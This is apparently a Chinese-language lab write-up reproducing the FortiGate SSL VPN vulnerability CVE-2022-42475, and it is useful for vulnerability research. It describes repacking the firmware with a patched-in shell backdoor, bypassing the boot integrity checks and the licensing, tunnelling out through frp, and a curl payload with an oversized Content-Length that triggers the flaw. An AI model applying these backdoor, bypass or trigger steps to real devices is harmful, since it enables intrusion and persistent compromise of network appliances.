---
title: CVE-2022-42475 foritgate SSLvpn漏洞 复现
date: 2023-04-04 19:54:59 +0800
categories:
  - CVE
tags:
  - pwn
  - cve
  - poc
permalink: /posts/id=58/
pin: false
published:
---
## 关于SSL VPN

```
用户端设备
   |
   | (通过互联网)
   |
SSL VPN服务器 --- 认证服务器
   |
企业内部网络（文件服务器、应用程序等）

```

SSL（安全套接字层）协议
SSL VPN利用SSL/TLS协议来加密客户端和服务器之间的数据传输，确保数据的隐私和完整性。
SSL VPN建立一个“隧道”，通过它安全地传输数据。这个隧道可以是基于浏览器的（适用于Web应用程序）或基于客户端的（提供更全面的网络访问）

当SSLVPN功能在防火墙中时，需要配置策略。
进入端口是fortigate虚拟的，输出端口任意，配置好准入用户和IP地址，和输出的IP地址范围，应该就可以了

## 固件下载和环境启动

fortigate固件镜像下载站：https://support.fortinet.com/Download/FirmwareImages.aspx
虚拟机下载：https://support.fortinet.com/Download/VMImages.aspx

下载任意镜像需要拥有一个fortinet旗下的正在运行的产品。这里采用的方法是下载一个防火墙的虚拟机镜像运行，用账户登陆的方式绑定license，这样账户就能访问下载页面了，虚拟机镜像默认初始账号admin，密码为空

飞塔CLI指令

```shell
# 查看映射IP
get system interface physcial

# 端口
show system interface port1


# 进入配置模式
config system interface
	# 配置端口和设置IP
	edit port1
	set ip 192.168.1.1 255.255.255.0
	# 保存退出
	end

# 开启Rest API：（方便后期查看攻击日志）
config log settingset rest-api-set enableset rest-api-get enableend
```

license获取
直接运行放到txt即可
https://github.com/rrrrrrri/fos-license-gen


## 固件重打包和植入后门

要进行调试我们就需要一个可执行shell命令的后门
这里参照 https://wzt.ac.cn/2023/03/02/fortios_padding/ 进行重打包配置
fortinet在19年的一个CVE以后添加了文件系统的校验，要重打包就要patch掉校验逻辑，根据启动的提示字符串`System is starting...`可以定位到校验二进制文件`/bin/init`

```c
__int64 __fastcall main(unsigned int a1, const char **a2, char **a3)
{
  int v5; // r8d
  int v6; // r9d
  const char *v7; // rax
  int v8; // edx
  bool v9; // cf
  bool v10; // zf
  const char *v11; // rsi
  __int64 v12; // rcx
  const char *v13; // rdi
  int v14; // eax
  int v15; // r12d
  int v16; // edx
  int v17; // ecx
  int v18; // r8d
  int v19; // r9d
  int v20; // r9d
  const char *v21; // rsi
  int v22; // edx
  int v23; // ecx
  int v24; // r8d
  int v25; // r9d
  int v26; // r9d
  int v27; // r9d
  const char *v28; // rax
  __int64 v29; // rdi
  int v30; // r9d
  int v31; // edx
  int v32; // ecx
  int v33; // r8d
  int v34; // r9d
  const char *v36; // [rsp-8h] [rbp-58h]
  struct timespec requested_time; // [rsp+0h] [rbp-50h] BYREF
  char *argv[8]; // [rsp+10h] [rbp-40h] BYREF

  argv[3] = __readfsqword(0x28u);
  sub_451F90("main");
  sub_44D8B0("main", 2567LL);
  nullsub_93656();
  sub_44D920(a2);
  if ( a1 > 1 && !strcmp(a2[1], "return99") )
    exit(99);
  sub_17C6090();
  qword_469A218 = 0LL;
  qword_469A230 = sub_44F710;
  qword_469A258 = 0LL;
  qword_469A2A0 = qword_BD164C0 + 100;
  qword_469A270 = sub_44F750;
  qword_469A298 = 0LL;
  qword_469A2B0 = sub_44E080;
  sub_17C60D0(&unk_469A280);
  qword_469A2D8 = 0LL;
  qword_469A2F0 = sub_44FC30;
  qword_469A2E8 = 0LL;
  sub_17C6150(&unk_469A2C0, qword_BD164C0 + 6000);
  v7 = *a2;
  LOBYTE(v8) = strcmp(*a2, "/bin/init") != 0;
  v9 = 0;
  v10 = v8 == 0;
  if ( !v8 )
  {
    argv[0] = "/bin/initXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX";
    argv[1] = 0LL;
    execve("/bin/initXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX", argv, 0LL);
    v7 = *a2;
  }
  v11 = v7;
  v12 = 9LL;
  v13 = "/bin/init";
  do
  {
    if ( !v12 )
      break;
    v9 = *v11 < *v13;
    v10 = *v11++ == *v13++;
    --v12;
  }
  while ( v10 );
  if ( (!v9 && !v10) != v9 )
    return sub_448BE0(a1, a2);
  t_print("\nSystem is starting...\n", v11, v8, v12, v5, v6, requested_time.tv_sec);
  fflush(stdout);
  sub_206F550();
  reboot(0);
  close(0);
  close(1);
  close(2);
  sub_44DE70(0);
  chdir("/");
  setsid();
  v14 = sub_44DDE0("/dev/null");
  v15 = v14;
  if ( v14 >= 0 )
  {
    dup2(v14, 0);
    dup2(v15, 1);
    dup2(v15, 2);
  }
  if ( sub_290D6A0(1024LL, 1LL) < 0 )
  {
    t_print("could not setup epoll in init.\n", 1, v16, v17, v18, v19, requested_time.tv_sec);
  }
  else if ( sub_452BF0() >= 0 )
  {
    sub_450A70();
    sub_1F6C7A0(16, "%s()-%d: %s: run_initlevel(SYSINIT)\n\n", "main", 2649, "main", v20, requested_time.tv_sec);
    sub_44E2C0(1LL);
    sub_451660();
    sub_450BB0();
    if ( sub_44F230() )
      do_halt();
    if ( !sub_44F190() )
      do_halt();
    if ( sub_2744CC0() )
    {
      sub_2824D70();
      if ( sub_44DFB0("/bin/fips_self_test") )
        do_halt();
    }
    else
    {
      if ( sub_44F1E0() )
        do_halt();
      sub_27804D0();
    }
    v21 = "/tmp/terminfo";
    sub_2A18D80("/data/etc/terminfo");
    sub_451270("/data/etc/terminfo", "/tmp/terminfo");
    sub_451310();
LABEL_22:
    sub_21A3DA0(0LL);
    sub_21F39A0();
    if ( nCfg_debug_zone )
      sub_1F6C6F0(nCfg_debug_zone + 20352);
    else
      t_print("Error debug zone is not initialized\n", v21, v22, v23, v24, v25, requested_time.tv_sec);
    if ( dword_46990A8 )
    {
      dword_46990A8 = 0;
      sub_21F3A50(256LL);
    }
    sub_1F6C7A0(16, "%s()-%d: %s: run_initlevel(FWINIT)\n\n", "main", 2756, "main", v26, requested_time.tv_sec);
    sub_44E2C0(2LL);
    sub_1F6C7A0(16, "%s()-%d: %s: run_initlevel(ZEBOSINIT)\n\n", "main", 2759, "main", v27, requested_time.tv_sec);
    sub_44E2C0(3LL);
    requested_time.tv_sec = 2LL;
    requested_time.tv_nsec = 0LL;
    while ( nanosleep(&requested_time, &requested_time) == -1 && *__errno_location() == 4 )
      ;
    sub_450CE0();
    while ( 1 )
    {
      dword_46990A0 = sub_20BC540();
      if ( !dword_46990A0 )
        break;
      sub_1F6C7A0(16, "%s()-%d: %s: run_initlevel(ONCE)\n\n", "main", 2783, "main", v34, requested_time.tv_sec);
      sub_44E2C0(4LL);
      v10 = sub_2744CC0() == 0;
      v28 = key;
      if ( !v10 )
        v28 = " in FIPS-CC mode";
      fgtlog_vf_text(36864, 255, 255, 32009, 0, "msg=\"Fortigate started%s\"", v28);
      v29 = 32LL;
      sub_28F8D10(32LL, 0LL, 0LL, 0LL);
      v21 = v36;
      if ( sub_451380() )
        goto LABEL_38;
      sub_451080(32LL);
      if ( dword_46990A8 )
        goto LABEL_22;
      v21 = "%s()-%d: %s: run_initlevel(FWDOWN)\n\n";
      sub_1F6C7A0(16, "%s()-%d: %s: run_initlevel(FWDOWN)\n\n", "main", 2807, "main", v30, requested_time.tv_sec);
      v29 = 8LL;
      sub_44E2C0(8LL);
      if ( !dword_46990A4 )
        goto LABEL_38;
      dword_46990A4 = 0;
    }
    v21 = 0LL;
    v29 = "unknown operation mode(%d)\n";
    t_print("unknown operation mode(%d)\n", 0, v31, v32, v33, v34, requested_time.tv_sec);
LABEL_38:
    sub_44F3A0(v29, v21);
  }
  return 0xFFFFFFFFLL;
}
```


dohalt导致系统停止，对应的if判断就是校验函数

sub_44F230：函数内部执行了 ioctl 和 socket 等函数，向内核发送或接收某些信息

sub_44F190：fork一个子进程进程，开头进行异或操作得到/.fgtsum，然后fopen,应该是校验
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20240123113827.png)

sub_44DFB0("/bin/fips_self_test")：同样fork一个子进程，去执行/bin/fips_self_test

sub_44F1E0：同样fork一个子进程，对rootfs做了对比校验

```c
_BOOL8 __fastcall sub_277FB40(unsigned int a1)
{
  __int64 v1; // rax
  __int64 v2; // r12
  char *v4; // [rsp+8h] [rbp-138h] BYREF
  char v5[268]; // [rsp+10h] [rbp-130h] BYREF
  __int16 v6; // [rsp+11Ch] [rbp-24h]
  char v7; // [rsp+11Eh] [rbp-22h]
  unsigned __int64 v8; // [rsp+128h] [rbp-18h]

  v8 = __readfsqword(0x28u);
  qmemcpy(v5, &off_35CECE0, sizeof(v5));
  v6 = 256;
  v7 = 0;
  v4 = v5;
  v1 = d2i_RSAPublicKey(0LL, &v4, 270LL);
  if ( v1 && (v2 = v1, !sub_2745E90("/data/rootfs.gz", "/data/rootfs.gz.chk", a1, v1)) )
    return sub_2745E90("/data/flatkc", "/data/flatkc.chk", a1, v2) == 0;
  else
    return 0LL;
}
```

直接将 do_halt 函数的第一条指令改为 ret，这样就算无法通过验证，也不会执行重启操作。

使用的GitHub项目：https://github.com/rrrrrrri/fgt-auto-repack?tab=readme-ov-file





```bash
sudo -i
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \chmod 755 msfinstall && \./msfinstall
```






















































## 固件提取和重打包

### 提取fortigate_VMX的文件系统

1.VMware加载fortigate镜像，进行初始化

2.然后将vmdk硬盘(注意:是本地虚拟机生成的硬盘)添加硬盘到ubuntu虚拟机上，即可访问内容


![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20240119173401.png)

然后拿到这样
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20240119174813.png)

+ 解压rootfs

```shell
#!/bin/bash
gzip -d rootfs.gz
mkdir fs
cd fs
sudo cpio -idmv < ../rootfs # 解压rootfs
```

+ 解压bin

```shell
sudo chroot . /sbin/xz --check=sha256 -d /bin.tar.xz
sudo chroot . /sbin/ftar -xf /bin.tar
```




















### 提取fortigate_KVM 的文件系统

```shell
sudo guestfish --rw -a ./fortios.qcow2
run 
mount /dev/sda1 /
copy-out /rootfs.gz /home/ef4tless/Desktop/7.0.0ALI/
copy-out /flatkc /home/ef4tless/Desktop/7.0.0ALI/
vmlinux-to-elf flatkc flatkc_elf
```

得到rootfs后其余步骤和VMX相同


## 固件调试及初始化

为了能用gdb调试防火墙虚拟机，先安装virt-machine，新建KVM虚拟机，可参照[官方文档](https://support.fortinet.com.cn/uploadfile/2016/0512/20160512023859365.pdf)

编辑KVM虚拟机设置

```shell
export EDITOR=gedit
virsh edit Fortigate-7.2.1 # 虚拟机名

<domain type='kvm'>

change to

<domain type='qemu' xmlns:qemu='http://libvirt.org/schemas/domain/qemu/1.0'>
    <qemu:commandline>
        <qemu:arg value='-s'/>
    </qemu:commandline>
```

再次启动，即可用gdb进行内核级调试

```shell
target remote :1234 
hbreak * 0xffffffff807d1cd4 
c 
```

## 漏洞复现&分析

在复现开始之前，明确一下fortigate防火墙启动流程：

1、由内核文件flatkc解压 rootfs.gz，调用 fgt_verify 校验文件系统各信息，判断后执行/sbin/init

2、/sbin/init 解压文件系统，调用执行 /bin/init 

3、/bin/init 会进行多次的系统校验，校验失败则重启系统

### 搭建调试环境

首先是fortigate漏洞环境的配置，启动Fortigate_VM，进入web界面

这里需要绑定许可证，关于许可证的生成可以参考：https://wzt.ac.cn/2023/03/02/fortios_padding/

重启后进入配置页面，配置SSL-vpn，配置如下图

<img src="https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20230404150227162.png" alt="image-20230404150227162" style="zoom:50%;" />



<img src="https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20230406110208062.png" alt="image-20230406110208062" style="zoom:50%;" />



<img src="https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20230406110256478.png" alt="image-20230406110256478" style="zoom:50%;" />

<img src="https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20230406110329044.png" alt="image-20230406110329044" style="zoom:50%;" />

<img src="https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20230406110402040.png" alt="image-20230406110402040" style="zoom:50%;" />



在访问页面中，由于SSL1.0不被大部分浏览器所支持，需要添加一个配置文件

![image-20230406110454530](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20230406110454530.png)

```shell
# ef4tless为用户名
export OPENSSL_CONF=/home/ef4tless/openssl_allow_tls1.0.cnf
```

openssl_allow_tls1.0.cnf

```shell
openssl_conf = openssl_init

[openssl_init]
ssl_conf = ssl_sect

[ssl_sect]
system_default = system_default_sect

[system_default_sect]
CipherString = DEFAULT@SECLEVEL=1
```

![image-20230417193727934](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20230417193727934.png)

然后是调试环境的配置(需要先提取固件)

#### patch /bin/init 文件

为了获取完整的shell以便于调试，我们需要patch一个后门函数

在防火墙输入execute ping sh 报错 `Unable to resolve hostname.`

在ida中搜索字符串得到该命令所调用函数`sub_23DDB20`

![image-20230406150341909](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20230406150341909.png)

修改为

![image-20230410141626503](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20230410141626503.png)

这样在执行 execute ping sh 的时候相当于执行 system('sh')

#### 绕过文件系统检测

由于后续我们需要在fortigate中放入busybox等调试工具，而fortgate会对文件系统进行一些检测，为使fortigate正常启动，需要patch几个启动文件

首先是修改flatkc中的`fgt_verify`函数的返回值为0，绕过对文件系统hash的验证，内核调试下的gdb在验证函数位置下断点

![image-20230406173414286](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20230406173414286.png)

```shell
b *0xFFFFFFFF807D0F1F
c
```

然后在执行验证后，将eax置零(return 返回值)patch为0，绕过内核引导程序

```shell
set $eax=0
```

在init中同样存在类似的检测，定位到其中的如下校验函数，进行静态patch

![](https://pic.imgdb.cn/item/6432f04a0d2dde5777ea96ed.jpg)

![](https://pic.imgdb.cn/item/6432f0580d2dde5777eaab09.jpg)

#### 放入gdbserver , busybox ,frpc等文件并打包镜像

busybox

1.下载：https://busybox.net/downloads/

2.预编译配置：

​	（1）make menuconfig

​	（2）修改配置信息

​				Build Options —> 选择[*] Build Busybox as a static binary（no shared libs）

​				去掉 Coreutils—>sync 选项

​	（3）make 

​				make install

​				编译完成后文件在./_install/bin/busybox

3.复制 busybox 到 rootfs 的/bin 目录下

```shell
cd fs
cp ../busybox-1.35.0/_install/bin/busybox ./bin/
chmod 777 ./bin/busybox
```

4.删除原来的sh软链接并创建busybox软链接

```shell
sudo rm -rf ./bin/sh
cd bin
ln -s /bin/busybox sh
```



frpc

```shell
# frps.ini
[common]
bind_port = 3000


# frpc.ini
[common]
server_addr = 192.168.122.1
server_port = 3000

[ssh]
type = tcp
local_ip = 127.0.0.1
local_port = 1235
remote_port = 1236
```
gdbserver

下载静态编译的gdbserver：https://github.com/hugsy/gdb-static

或者自己编译一份

下载gdb源码：https://www.gnu.org/software/gdb/download/

```shell
cd gdb/gdbserver
./configure
```

使用文本编辑器打开`gdbserver/Makefile`文件，并找到以下行：

```
LDFLAGS = ...
```

修改这一行，添加静态链接选项`-static`：

```
LDFLAGS = -static ...
```

```shell
# 在当前文件夹得到gdbserver
make gdbserver
```



将上述工具放入.bin/文件夹里，打包镜像

```shell
cd fs
sudo chroot . /sbin/ftar -cf bin.tar ./bin
sudo rm -rf bin.tar.xz
sudo chroot . /sbin/xz --check=sha256 -e bin.tar
sudo rm -rf bin/
mkdir ../make
find . -print0 | cpio --null -ov --format=newc | gzip -9 > ../make/rootfs.gz


sudo guestfish --rw -a ./fortios.qcow2
run
mount /dev/sda1 /
copy-in /home/ef4tless/Desktop/7.0.0ALI/make/rootfs.gz /
```

### 漏洞利用

启动虚拟机，启动frp与主机实现连接

![image-20230406111825521](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20230406111825521.png)

用ssh连接fortigate，运行 gdbserver attach sslvpnd

```shell
ssh admin@192.168.122.249
execute ping sh
busybox mkdir /usr/bin
busybox --install -s /usr/bin
gdbserver --attach 192.168.122.249:1235 `pidof sslvpnd`
```

![image-20230406111852039](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20230406111852039.png)

发送 payload触发漏洞

```shell
curl --tlsv1.0 --tls-max 1.0 -v -k --ciphers DEFAULT@SECLEVEL=0 -H "ContentLength: 2147483647" --data 1 https://192.168.122.249:10443/remote/login
```

![image-20230406111949683](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20230406111949683.png)



## tips

创建虚拟机报错

![image-20230417175113302](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20230417175113302.png)

可能是guestfish占用了镜像资源，也有可能是镜像没有运行权限